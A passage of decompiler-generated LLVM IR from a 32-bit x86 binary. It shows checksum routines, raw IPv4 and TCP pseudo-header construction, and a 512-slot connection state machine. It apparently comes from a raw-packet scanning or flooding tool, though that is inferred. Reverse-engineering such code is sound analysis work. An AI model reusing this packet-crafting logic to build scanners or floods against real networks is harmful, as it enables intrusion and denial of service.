  uselistorder label %dec_label_pc_8049eae, { 1, 0 }
  uselistorder label %dec_label_pc_8049e7e, { 1, 0 }
  uselistorder label %dec_label_pc_8049e4e, { 1, 0 }
}

define i32 @function_804ce1a(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ce1a:
  %v0_804ce20 = load i32, i32* @global_var_8063b48.290, align 8
  %v1_804ce29 = call i32 @function_80517df(i32 %v0_804ce20)
  %v5_804ce31 = and i32 %v1_804ce29, %arg1
  %v1_804ce37 = call i32 @function_80482d8(i32 %v5_804ce31)
  %v1_804ce41 = sub i32 -1, %arg1
  %v2_804ce43 = and i32 %v1_804ce37, %v1_804ce41
  %v5_804ce45 = xor i32 %v2_804ce43, %v5_804ce31
  ret i32 %v5_804ce45
}

define i32 @function_804ce4a(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804ce4a:
  %v4_804ce8333 = add i32 %arg2, -1
  %v9_804ce8334 = sub i32 0, %arg2
  %v10_804ce8335 = and i32 %arg2, %v9_804ce8334
  %v11_804ce8336 = icmp slt i32 %v10_804ce8335, 0
  %v12_804ce8337 = icmp eq i32 %v4_804ce8333, 0
  %v13_804ce8338 = icmp slt i32 %v4_804ce8333, 0
  %v3_804ce8739 = icmp eq i1 %v13_804ce8338, %v11_804ce8336
  %v4_804ce8740 = icmp eq i1 %v12_804ce8337, false
  %v5_804ce8741 = and i1 %v4_804ce8740, %v3_804ce8739
  br i1 %v5_804ce8741, label %dec_label_pc_804ce63.lr.ph, label %dec_label_pc_804ce89

dec_label_pc_804ce63.lr.ph:                       ; preds = %dec_label_pc_804ce4a
  %v4_804ce66.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ce63

dec_label_pc_804ce63:                             ; preds = %dec_label_pc_804ce63.lr.ph, %dec_label_pc_804ce63
  %v4_804ce66 = phi i32 [ %v4_804ce66.pre, %dec_label_pc_804ce63.lr.ph ], [ %v6_804ce66, %dec_label_pc_804ce63 ]
  %stack_var_-24.045 = phi i16 [ 0, %dec_label_pc_804ce63.lr.ph ], [ %v9_804ce78, %dec_label_pc_804ce63 ]
  %stack_var_8.044 = phi i32 [ %arg2, %dec_label_pc_804ce63.lr.ph ], [ %v4_804ce7f, %dec_label_pc_804ce63 ]
  %stack_var_4.043 = phi i16* [ %arg1, %dec_label_pc_804ce63.lr.ph ], [ %v23_804ce7b, %dec_label_pc_804ce63 ]
  %v3_804ce7542 = phi i32 [ 0, %dec_label_pc_804ce63.lr.ph ], [ %v6_804ce75, %dec_label_pc_804ce63 ]
  %v4_804ce63 = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804ce66 = load i16, i16* %stack_var_4.043, align 2
  %v3_804ce66 = zext i16 %v2_804ce66 to i32
  %v5_804ce66 = and i32 %v4_804ce66, -65536
  %v6_804ce66 = or i32 %v5_804ce66, %v3_804ce66
  store i32 %v6_804ce66, i32* @ecx, align 4
  %sext51 = mul i32 %v3_804ce7542, 65536
  %v4_804ce75 = sdiv i32 %sext51, 65536
  %v6_804ce75 = add nsw i32 %v3_804ce66, %v4_804ce75
  %v11_804ce75 = icmp ult i32 %v6_804ce75, %v4_804ce75
  %v26_804ce75 = trunc i32 %v6_804ce75 to i16
  %v7_804ce78 = zext i1 %v11_804ce75 to i16
  %v9_804ce78 = add i16 %v7_804ce78, %stack_var_-24.045
  %v5_804ce7b = add i32 %v4_804ce63, 2
  %v23_804ce7b = inttoptr i32 %v5_804ce7b to i16*
  %v4_804ce7f = add i32 %stack_var_8.044, -2
  %v4_804ce83 = add i32 %stack_var_8.044, -3
  %v9_804ce83 = sub i32 2, %stack_var_8.044
  %v10_804ce83 = and i32 %v4_804ce7f, %v9_804ce83
  %v11_804ce83 = icmp slt i32 %v10_804ce83, 0
  %v12_804ce83 = icmp eq i32 %v4_804ce83, 0
  %v13_804ce83 = icmp slt i32 %v4_804ce83, 0
  %v3_804ce87 = icmp eq i1 %v13_804ce83, %v11_804ce83
  %v4_804ce87 = icmp eq i1 %v12_804ce83, false
  %v5_804ce87 = and i1 %v4_804ce87, %v3_804ce87
  br i1 %v5_804ce87, label %dec_label_pc_804ce63, label %dec_label_pc_804ce89

dec_label_pc_804ce89:                             ; preds = %dec_label_pc_804ce63, %dec_label_pc_804ce4a
  %v3_804ce75.lcssa = phi i16 [ 0, %dec_label_pc_804ce4a ], [ %v26_804ce75, %dec_label_pc_804ce63 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %dec_label_pc_804ce4a ], [ %v23_804ce7b, %dec_label_pc_804ce63 ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %dec_label_pc_804ce4a ], [ %v4_804ce7f, %dec_label_pc_804ce63 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %dec_label_pc_804ce4a ], [ %v9_804ce78, %dec_label_pc_804ce63 ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804cecd.preheader, label %dec_label_pc_804ce8f

dec_label_pc_804ce8f:                             ; preds = %dec_label_pc_804ce89
  %v1_804ce92 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804ce92 = load i8, i8* %v1_804ce92, align 1
  %v3_804ce92 = zext i8 %v2_804ce92 to i32
  %v4_804cea0 = sext i16 %v3_804ce75.lcssa to i32
  %v6_804cea0 = add nsw i32 %v3_804ce92, %v4_804cea0
  %v11_804cea0 = icmp ult i32 %v6_804cea0, %v4_804cea0
  %v26_804cea0 = trunc i32 %v6_804cea0 to i16
  %v7_804cea3 = zext i1 %v11_804cea0 to i16
  %v9_804cea3 = add i16 %v7_804cea3, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804cecd.preheader

dec_label_pc_804cecd.preheader:                   ; preds = %dec_label_pc_804ce8f, %dec_label_pc_804ce89
  %v3_804ceb2.ph = phi i16 [ %v3_804ce75.lcssa, %dec_label_pc_804ce89 ], [ %v26_804cea0, %dec_label_pc_804ce8f ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804ce89 ], [ %v9_804cea3, %dec_label_pc_804ce8f ]
  %v4_804cecd20 = sext i16 %v3_804ceb2.ph to i32
  %v4_804ced021 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804ced322 = udiv i32 %v4_804cecd20, 65536
  %v4_804ced323 = mul i32 %v4_804ced021, 65536
  %v5_804ced324 = or i32 %v4_804ced323, %v3_804ced322
  %v2_804ced725 = udiv i32 %v4_804ced021, 65536
  %v2_804ceda26 = or i32 %v5_804ced324, %v2_804ced725
  %v3_804ceda27 = icmp eq i32 %v2_804ceda26, 0
  %v1_804cede28 = icmp eq i1 %v3_804ceda27, false
  br i1 %v1_804cede28, label %dec_label_pc_804cea8, label %dec_label_pc_804cee0

dec_label_pc_804cea8:                             ; preds = %dec_label_pc_804cecd.preheader, %dec_label_pc_804cea8
  %v2_804ced731 = phi i32 [ %v2_804ced7, %dec_label_pc_804cea8 ], [ %v2_804ced725, %dec_label_pc_804cecd.preheader ]
  %v5_804ced330 = phi i32 [ %v5_804ced3, %dec_label_pc_804cea8 ], [ %v5_804ced324, %dec_label_pc_804cecd.preheader ]
  %v4_804cecd29 = phi i32 [ %v4_804cecd, %dec_label_pc_804cea8 ], [ %v4_804cecd20, %dec_label_pc_804cecd.preheader ]
  %v2_804cec3 = add i32 %v5_804ced330, %v4_804cecd29
  %v7_804cec3 = icmp ult i32 %v2_804cec3, %v4_804cecd29
  %v3_804cec5 = zext i1 %v7_804cec3 to i32
  %v5_804cec5 = add nuw nsw i32 %v3_804cec5, %v2_804ced731
  %sext = mul i32 %v2_804cec3, 65536
  %v4_804cecd = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804cec5, 65536
  %v4_804ced0 = sdiv i32 %sext50, 65536
  %v3_804ced3 = udiv i32 %v4_804cecd, 65536
  %v5_804ced3 = or i32 %sext50, %v3_804ced3
  %v2_804ced7 = udiv i32 %v4_804ced0, 65536
  %v2_804ceda = or i32 %v5_804ced3, %v2_804ced7
  %v3_804ceda = icmp eq i32 %v2_804ceda, 0
  %v1_804cede = icmp eq i1 %v3_804ceda, false
  br i1 %v1_804cede, label %dec_label_pc_804cea8, label %dec_label_pc_804cecd.dec_label_pc_804cee0_crit_edge

dec_label_pc_804cecd.dec_label_pc_804cee0_crit_edge: ; preds = %dec_label_pc_804cea8
  br label %dec_label_pc_804cee0

dec_label_pc_804cee0:                             ; preds = %dec_label_pc_804cecd.dec_label_pc_804cee0_crit_edge, %dec_label_pc_804cecd.preheader
  %v4_804cecd.lcssa = phi i32 [ %v4_804cecd, %dec_label_pc_804cecd.dec_label_pc_804cee0_crit_edge ], [ %v4_804cecd20, %dec_label_pc_804cecd.preheader ]
  %v1_804cee3 = urem i32 %v4_804cecd.lcssa, 65536
  %v1_804cee5 = xor i32 %v1_804cee3, 65535
  ret i32 %v1_804cee5

; uselistorder directives
  uselistorder i32 %v5_804ced3, { 1, 0 }
  uselistorder i32 %v4_804cecd, { 1, 0, 2 }
  uselistorder i32 %v2_804ced725, { 1, 0 }
  uselistorder i32 %v4_804ced021, { 1, 0 }
  uselistorder i32 %v4_804cecd20, { 2, 1, 0 }
  uselistorder i32 %v4_804cea0, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804ce75.lcssa, { 1, 0 }
  uselistorder i32 %v4_804ce83, { 1, 0 }
  uselistorder i32 %v6_804ce75, { 1, 2, 0 }
  uselistorder i32 %v4_804ce75, { 1, 0 }
  uselistorder i32 %v6_804ce66, { 1, 0 }
  uselistorder label %dec_label_pc_804cea8, { 1, 0 }
  uselistorder label %dec_label_pc_804ce63, { 1, 0 }
}

define i32 @function_804cef2(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_804cef2:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg2 to i32
  %v1_804cf06 = add i32 %arg1, 12
  %v2_804cf06 = inttoptr i32 %v1_804cf06 to i32*
  %v3_804cf06 = load i32, i32* %v2_804cf06, align 4
  %v1_804cf0f = add i32 %arg1, 16
  %v2_804cf0f = inttoptr i32 %v1_804cf0f to i32*
  %v3_804cf0f = load i32, i32* %v2_804cf0f, align 4
  %v1_804cf22 = call i32 @function_80517c0(i32 20)
  %v1_804cf3c = call i32 @function_8051f6a(i32 32)
  store i32 %v1_804cf3c, i32* %ecx.global-to-local, align 4
  %v2_804cf4f = inttoptr i32 %v1_804cf3c to i32*
  store i32 %v3_804cf06, i32* %v2_804cf4f, align 4
  %v1_804cf54 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804cf54 = add i32 %v1_804cf54, 4
  %v3_804cf54 = inttoptr i32 %v2_804cf54 to i32*
  store i32 %v3_804cf0f, i32* %v3_804cf54, align 4
  %v1_804cf5a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804cf5a = add i32 %v1_804cf5a, 8
  %v3_804cf5a = inttoptr i32 %v2_804cf5a to i32*
  store i32 0, i32* %v3_804cf5a, align 4
  store i32 %tmp2, i32* @ecx, align 4
  %v1_804cf63 = add i32 %v1_804cf3c, 12
  store i32 %v1_804cf63, i32* %edx.global-to-local, align 4
  %v2_804cf66 = load i32, i32* %arg2, align 4
  %v2_804cf68 = inttoptr i32 %v1_804cf63 to i32*
  store i32 %v2_804cf66, i32* %v2_804cf68, align 4
  %v0_804cf6a = load i32, i32* @ecx, align 4
  %v1_804cf6a = add i32 %v0_804cf6a, 4
  %v2_804cf6a = inttoptr i32 %v1_804cf6a to i32*
  %v3_804cf6a = load i32, i32* %v2_804cf6a, align 4
  %v1_804cf6d = load i32, i32* %edx.global-to-local, align 4
  %v2_804cf6d = add i32 %v1_804cf6d, 4
  %v3_804cf6d = inttoptr i32 %v2_804cf6d to i32*
  store i32 %v3_804cf6a, i32* %v3_804cf6d, align 4
  %v0_804cf70 = load i32, i32* @ecx, align 4
  %v1_804cf70 = add i32 %v0_804cf70, 8
  %v2_804cf70 = inttoptr i32 %v1_804cf70 to i32*
  %v3_804cf70 = load i32, i32* %v2_804cf70, align 4
  %v1_804cf73 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cf73 = add i32 %v1_804cf73, 8
  %v3_804cf73 = inttoptr i32 %v2_804cf73 to i32*
  store i32 %v3_804cf70, i32* %v3_804cf73, align 4
  %v0_804cf76 = load i32, i32* @ecx, align 4
  %v1_804cf76 = add i32 %v0_804cf76, 12
  %v2_804cf76 = inttoptr i32 %v1_804cf76 to i32*
  %v3_804cf76 = load i32, i32* %v2_804cf76, align 4
  %v1_804cf79 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cf79 = add i32 %v1_804cf79, 12
  %v3_804cf79 = inttoptr i32 %v2_804cf79 to i32*
  store i32 %v3_804cf76, i32* %v3_804cf79, align 4
  %v0_804cf7c = load i32, i32* @ecx, align 4
  %v1_804cf7c = add i32 %v0_804cf7c, 16
  %v2_804cf7c = inttoptr i32 %v1_804cf7c to i32*
  %v3_804cf7c = load i32, i32* %v2_804cf7c, align 4
  %v1_804cf7f = load i32, i32* %edx.global-to-local, align 4
  %v2_804cf7f = add i32 %v1_804cf7f, 16
  %v3_804cf7f = inttoptr i32 %v2_804cf7f to i32*
  store i32 %v3_804cf7c, i32* %v3_804cf7f, align 4
  %v2_804cf88 = inttoptr i32 %v1_804cf3c to i16*
  %v3_804cf88 = call i32 @function_804ce4a(i16* %v2_804cf88, i32 32)
  %v1_804cf9a = call i32 @function_8052915(i32 %v1_804cf3c)
  %v4_804cfa2 = urem i32 %v3_804cf88, 65536
  ret i32 %v4_804cfa2

; uselistorder directives
  uselistorder i32 %v1_804cf3c, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804cfad(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804cfad:
  %tmp11 = trunc i32 %arg4 to i8
  %sext3 = mul i32 %arg4, 16777216
  %v4_804cfb3 = sdiv i32 %sext3, 16777216
  %v4_804cfb9 = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v1_804cfd6 = add i32 %v4_804cfb9, 1
  %v2_804cfd6 = inttoptr i32 %v1_804cfd6 to i8*
  store i8 0, i8* %v2_804cfd6, align 1
  %v1_804cfdd = add i32 %arg5, 20
  %v1_804cfe3 = trunc i32 %v1_804cfdd to i16
  %v3_804cfe3 = add i32 %v4_804cfb9, 2
  %v4_804cfe3 = inttoptr i32 %v3_804cfe3 to i16*
  store i16 %v1_804cfe3, i16* %v4_804cfe3, align 2
  %v2_804cfe7 = call i32 @function_80482d8(i32 %v4_804cfb3)
  %v1_804cff1 = trunc i32 %v2_804cfe7 to i16
  %v3_804cff1 = add i32 %v4_804cfb9, 4
  %v4_804cff1 = inttoptr i32 %v3_804cff1 to i16*
  store i16 %v1_804cff1, i16* %v4_804cff1, align 2
  %v1_804cff8 = add i32 %v4_804cfb9, 6
  %v2_804cff8 = inttoptr i32 %v1_804cff8 to i16*
  store i16 0, i16* %v2_804cff8, align 2
  %v1_804d001 = add i32 %v4_804cfb9, 8
  %v2_804d001 = inttoptr i32 %v1_804d001 to i8*
  store i8 -1, i8* %v2_804d001, align 1
  %v3_804d00b = add i32 %v4_804cfb9, 9
  %v4_804d00b = inttoptr i32 %v3_804d00b to i8*
  store i8 %tmp11, i8* %v4_804d00b, align 1
  %v1_804d011 = add i32 %v4_804cfb9, 10
  %v2_804d011 = inttoptr i32 %v1_804d011 to i16*
  store i16 0, i16* %v2_804d011, align 2
  %v2_804d01d = add i32 %v4_804cfb9, 12
  %v3_804d01d = inttoptr i32 %v2_804d01d to i32*
  store i32 %arg3, i32* %v3_804d01d, align 4
  %v2_804d026 = add i32 %v4_804cfb9, 16
  %v3_804d026 = inttoptr i32 %v2_804d026 to i32*
  store i32 %arg2, i32* %v3_804d026, align 4
  ret i32 %arg2

; uselistorder directives
  uselistorder i8 -1, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_804d02b(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d02b:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d02b = load i32, i32* @ebp, align 4
  store i32 %v0_804d02b, i32* %stack_var_-4, align 4
  %v4_804d031 = add i32 %arg1, -2
  %v9_804d031 = sub i32 1, %arg1
  %v10_804d031 = and i32 %v9_804d031, %arg1
  %v11_804d031 = icmp slt i32 %v10_804d031, 0
  %v12_804d031 = icmp eq i32 %v4_804d031, 0
  %v13_804d031 = icmp slt i32 %v4_804d031, 0
  %v3_804d035 = icmp eq i1 %v13_804d031, %v11_804d031
  %v4_804d035 = icmp eq i1 %v12_804d031, false
  %v5_804d035 = and i1 %v4_804d035, %v3_804d035
  br i1 %v5_804d035, label %dec_label_pc_804d040, label %dec_label_pc_804d055

dec_label_pc_804d040:                             ; preds = %dec_label_pc_804d02b
  %v1_804d046 = call i32 @function_8050138(i32 %arg1)
  %v2_804d058.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804d055

dec_label_pc_804d055:                             ; preds = %dec_label_pc_804d02b, %dec_label_pc_804d040
  %v2_804d058 = phi i32 [ %v2_804d058.pre, %dec_label_pc_804d040 ], [ %v0_804d02b, %dec_label_pc_804d02b ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804d040 ], [ 1, %dec_label_pc_804d02b ]
  store i32 %v2_804d058, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804d031, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d055, { 1, 0 }
}

define i32 @function_804d05a() local_unnamed_addr {
dec_label_pc_804d05a:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %v15_804d060 = ptrtoint i32* %stack_var_-636 to i32
  store i32 512, i32* %eax.global-to-local, align 4
  %v2_804d078 = call i32 @function_80504b0(i32* null)
  store i32 %v2_804d078, i32* %eax.global-to-local, align 4
  store i32 %v2_804d078, i32* @ebx, align 4
  %v1_804d082 = call i32 @function_80482d8(i32 0)
  %v1_804d087 = load i32, i32* @ebx, align 4
  %v2_804d087 = xor i32 %v1_804d087, %v1_804d082
  store i32 %v2_804d087, i32* @eax, align 4
  %v1_804d08d = call i32 @function_8052cec(i32 %v2_804d087)
  store i32 %v1_804d08d, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v1_804d0a3 = call i32 @function_80517c0(i32 23)
  %v15_804d0b8 = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804d0b8, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804d0d0 = call i32 @function_8051f6a(i32 513)
  store i32 %v1_804d0d0, i32* %edx.global-to-local, align 4
  store i32 513, i32* %eax.global-to-local, align 4
  %v3_804d0ec = inttoptr i32 %v1_804d0d0 to i8*
  %v4_804d0ec = call i32 @function_805143c(i8* %v3_804d0ec, i32 0, i32 513)
  %v1_804d121 = add i32 %v15_804d060, -14337
  %v2_804d124 = and i32 %v1_804d121, -16
  store i32 2560, i32* %edx.global-to-local, align 4
  %v1_804d147 = inttoptr i32 %v2_804d124 to i8*
  store i32 %v2_804d124, i32* @edi, align 4
  %v1_804d14c = and i32 %v1_804d121, -256
  store i32 %v1_804d14c, i32* %eax.global-to-local, align 4
  %v5_804d14e = call i8* @_memset(i8* %v1_804d147, i32 %v1_804d14c, i32 2560)
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804d1ad = or i32 %v2_804d124, 9
  br label %dec_label_pc_804d159

dec_label_pc_804d159:                             ; preds = %dec_label_pc_804d05a, %dec_label_pc_804d159
  %storemerge141 = phi i32 [ 0, %dec_label_pc_804d05a ], [ %v4_804d1d2, %dec_label_pc_804d159 ]
  %v2_804d16d = mul nuw nsw i32 %storemerge141, 28
  %v2_804d16f = add i32 %v2_804d16d, %v2_804d124
  store i32 %v2_804d16f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d177 = inttoptr i32 %v2_804d16f to i32*
  store i32 0, i32* %v2_804d177, align 4
  %v0_804d179 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d179 = add i32 %v0_804d179, 4
  store i32 %v1_804d179, i32* %eax.global-to-local, align 4
  %v0_804d17c = load i32, i32* %edx.global-to-local, align 4
  %v2_804d17c = inttoptr i32 %v1_804d179 to i32*
  store i32 %v0_804d17c, i32* %v2_804d17c, align 4
  %v0_804d17e = load i32, i32* %eax.global-to-local, align 4
  %v1_804d17e = add i32 %v0_804d17e, 4
  store i32 %v1_804d17e, i32* %eax.global-to-local, align 4
  %v0_804d181 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d181 = inttoptr i32 %v1_804d17e to i32*
  store i32 %v0_804d181, i32* %v2_804d181, align 4
  %v0_804d183 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d183 = add i32 %v0_804d183, 4
  store i32 %v1_804d183, i32* %eax.global-to-local, align 4
  %v0_804d186 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d186 = inttoptr i32 %v1_804d183 to i32*
  store i32 %v0_804d186, i32* %v2_804d186, align 4
  %v0_804d188 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d188 = add i32 %v0_804d188, 4
  store i32 %v1_804d188, i32* %eax.global-to-local, align 4
  %v0_804d18b = load i32, i32* %edx.global-to-local, align 4
  %v2_804d18b = inttoptr i32 %v1_804d188 to i32*
  store i32 %v0_804d18b, i32* %v2_804d18b, align 4
  %v0_804d18d = load i32, i32* %eax.global-to-local, align 4
  %v1_804d18d = add i32 %v0_804d18d, 4
  store i32 %v1_804d18d, i32* %eax.global-to-local, align 4
  %v0_804d190 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d190 = inttoptr i32 %v1_804d18d to i32*
  store i32 %v0_804d190, i32* %v2_804d190, align 4
  %v0_804d192 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d192 = add i32 %v0_804d192, 4
  %v0_804d195 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d195 = inttoptr i32 %v1_804d192 to i32*
  store i32 %v0_804d195, i32* %v2_804d195, align 4
  %v3_804d1ad = add i32 %v2_804d1ad, %v2_804d16d
  %v4_804d1ad = inttoptr i32 %v3_804d1ad to i8*
  store i8 1, i8* %v4_804d1ad, align 1
  %v1_804d1ca = add i32 %v2_804d16f, 24
  store i32 %v1_804d1ca, i32* %edx.global-to-local, align 4
  %v2_804d1d0 = inttoptr i32 %v1_804d1ca to i32*
  store i32 %v1_804d0d0, i32* %v2_804d1d0, align 4
  %v4_804d1d2 = add nuw nsw i32 %storemerge141, 1
  store i32 %v4_804d1d2, i32* %eax.global-to-local, align 4
  %v15_804d1d8 = icmp eq i32 %v4_804d1d2, 512
  br i1 %v15_804d1d8, label %dec_label_pc_804d1e1.preheader, label %dec_label_pc_804d159

dec_label_pc_804d1e1.preheader:                   ; preds = %dec_label_pc_804d159
  %v2_804d0b2 = ptrtoint i32* %stack_var_-604 to i32
  %v2_804d627 = ptrtoint i32* %stack_var_-320 to i32
  %tmp35 = bitcast i32* %stack_var_-320 to i8*
  %v2_804d6ab = ptrtoint i32* %stack_var_-328 to i32
  %v2_804d703 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804d70a = ptrtoint i32* %stack_var_-192 to i32
  %v2_804d252 = or i32 %v2_804d124, 8
  %v2_804d384 = or i32 %v2_804d124, 11
  %v2_804d3be = or i32 %v2_804d124, 10
  %v2_804d33e = or i32 %v2_804d124, 4
  %v2_804df11 = add i32 %v2_804d124, 16
  br label %dec_label_pc_804d1e1

dec_label_pc_804d1e1:                             ; preds = %dec_label_pc_804e255, %dec_label_pc_804d1e1.preheader
  %stack_var_-624.0 = phi i32 [ %tmp, %dec_label_pc_804d1e1.preheader ], [ %stack_var_-624.1, %dec_label_pc_804e255 ]
  %stack_var_-620.0 = phi i32 [ %tmp3, %dec_label_pc_804d1e1.preheader ], [ %stack_var_-620.1, %dec_label_pc_804e255 ]
  br label %dec_label_pc_804d1ed

dec_label_pc_804d1ed:                             ; preds = %dec_label_pc_804d1e1, %dec_label_pc_804e255
  %storemerge = phi i32 [ 0, %dec_label_pc_804d1e1 ], [ %v4_804e255, %dec_label_pc_804e255 ]
  %storemerge39 = phi i32 [ 0, %dec_label_pc_804d1e1 ], [ %v4_804e255, %dec_label_pc_804e255 ]
  %stack_var_-620.238 = phi i32 [ %stack_var_-620.0, %dec_label_pc_804d1e1 ], [ %stack_var_-620.1, %dec_label_pc_804e255 ]
  %stack_var_-624.237 = phi i32 [ %stack_var_-624.0, %dec_label_pc_804d1e1 ], [ %stack_var_-624.1, %dec_label_pc_804e255 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804d1f3 = mul nuw nsw i32 %storemerge39, 4
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  %v2_804d201 = mul nuw nsw i32 %storemerge39, 28
  %v2_804d203 = add i32 %v2_804d201, %v2_804d124
  %v1_804d205 = add i32 %v2_804d203, 16
  store i32 %v1_804d205, i32* %eax.global-to-local, align 4
  %v1_804d208 = inttoptr i32 %v1_804d205 to i32*
  %v2_804d208 = load i32, i32* %v1_804d208, align 4
  store i32 %v2_804d208, i32* %eax.global-to-local, align 4
  %v1_804d20a = icmp eq i32 %v2_804d208, 0
  %v1_804d20c = icmp eq i1 %v1_804d20a, false
  br i1 %v1_804d20c, label %dec_label_pc_804d23c, label %dec_label_pc_804d20e

dec_label_pc_804d20e:                             ; preds = %dec_label_pc_804d1ed
  store i32 %storemerge39, i32* @ebx, align 4
  %v0_804d211 = load i32, i32* @esp, align 4
  %v1_804d214 = add i32 %v0_804d211, -16
  %v2_804d214 = inttoptr i32 %v1_804d214 to i32*
  store i32 0, i32* %v2_804d214, align 4
  %v1_804d216 = inttoptr i32 %storemerge39 to i32*
  %v2_804d216 = call i32 @function_80504b0(i32* %v1_804d216)
  store i32 %v2_804d216, i32* @esi, align 4
  %v0_804d223 = load i32, i32* @ebx, align 4
  %v1_804d225 = mul i32 %v0_804d223, 4
  store i32 %v1_804d225, i32* %edx.global-to-local, align 4
  %v2_804d233 = mul i32 %v0_804d223, 28
  %v1_804d237 = add i32 %v2_804df11, %v2_804d233
  store i32 %v1_804d237, i32* %eax.global-to-local, align 4
  %v2_804d23a = inttoptr i32 %v1_804d237 to i32*
  store i32 %v2_804d216, i32* %v2_804d23a, align 4
  br label %dec_label_pc_804d23c

dec_label_pc_804d23c:                             ; preds = %dec_label_pc_804d1ed, %dec_label_pc_804d20e
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804d252 = add i32 %v2_804d252, %v2_804d201
  %v4_804d252 = inttoptr i32 %v3_804d252 to i8*
  %v5_804d252 = load i8, i8* %v4_804d252, align 4
  %v6_804d252 = zext i8 %v5_804d252 to i32
  %v8_804d252 = and i32 %v2_804d201, -256
  %v9_804d252 = or i32 %v6_804d252, %v8_804d252
  store i32 %v9_804d252, i32* %eax.global-to-local, align 4
  store i32 %v6_804d252, i32* %edx.global-to-local, align 4
  store i32 %v6_804d252, i32* @edi, align 4
  %v1_804d276 = mul nuw nsw i32 %v6_804d252, 4
  %v2_804d276 = add nuw nsw i32 %v1_804d276, 134589944
  %v3_804d276 = inttoptr i32 %v2_804d276 to i32*
  %v4_804d276 = load i32, i32* %v3_804d276, align 4
  store i32 %v4_804d276, i32* %eax.global-to-local, align 4
  switch i8 %v5_804d252, label %dec_label_pc_804e255 [
    i8 0, label %dec_label_pc_804d27f
    i8 1, label %dec_label_pc_804d61d
    i8 2, label %dec_label_pc_804d96e
    i8 3, label %dec_label_pc_804daa1
    i8 4, label %dec_label_pc_804dbff
    i8 5, label %dec_label_pc_804dd32
    i8 6, label %dec_label_pc_804de90
    i8 7, label %dec_label_pc_804e080
    i8 8, label %dec_label_pc_804e110
  ]

dec_label_pc_804d27f:                             ; preds = %dec_label_pc_804d23c
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  %v3_804d295 = add i32 %v2_804d1ad, %v2_804d201
  %v4_804d295 = inttoptr i32 %v3_804d295 to i8*
  %v5_804d295 = load i8, i8* %v4_804d295, align 1
  %v10_804d299 = icmp eq i8 %v5_804d295, 1
  %v1_804d29b = icmp eq i1 %v10_804d299, false
  store i32 %v1_804d1f3, i32* %edx.global-to-local, align 4
  store i32 %v2_804d201, i32* %eax.global-to-local, align 4
  br i1 %v1_804d29b, label %dec_label_pc_804d34a, label %dec_label_pc_804d2a1

dec_label_pc_804d2a1:                             ; preds = %dec_label_pc_804d27f
  %v1_804d2b9 = add i32 %v2_804d203, 24
  store i32 %v1_804d2b9, i32* %eax.global-to-local, align 4
  %v1_804d2bc = inttoptr i32 %v1_804d2b9 to i32*
  %v2_804d2bc = load i32, i32* %v1_804d2bc, align 4
  store i32 %v2_804d203, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d2df = inttoptr i32 %v2_804d203 to i32*
